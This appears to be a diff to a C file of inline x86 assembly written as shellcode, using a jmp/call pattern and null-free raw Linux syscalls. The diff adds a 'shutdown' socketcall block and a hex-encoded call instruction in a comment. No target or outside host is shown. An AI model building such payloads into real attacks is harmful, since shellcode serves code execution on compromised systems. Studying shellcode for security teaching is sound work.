@@ -1,3 +1,5 @@
+
+
 void main(){
 __asm__(
 	"jmp label_cat				\n\t" 
@@ -23,6 +25,20 @@ __asm__(
 	"xorl   %edx,%edx                \n\t"	// EDX <- NULL
 	"int	$0x80                 \n\t"	// syscall
 
+
+	//shutdown
+	"xorl %eax, %eax				\n\t"
+	"inc %eax						\n\t"
+	"push %eax					\n\t"
+	"xorl %eax, %eax				\n\t"
+	"xorl %ebx, %ebx				\n\t"
+	"movb $0x66, %al				\n\t"
+	"movb $0x0D, %bl				\n\t"
+	"movl %esp, %ecx				\n\t"
+	"int    $0x80				\n\t"
+
+
+
 	// CALL exit
 	"xorl   %eax,%eax               \n\t"
 	"inc 	%eax					\n\t"
@@ -39,3 +55,4 @@ __asm__(
 
 
 }
+//\xE8\xFF\xF8\xFF\xFF
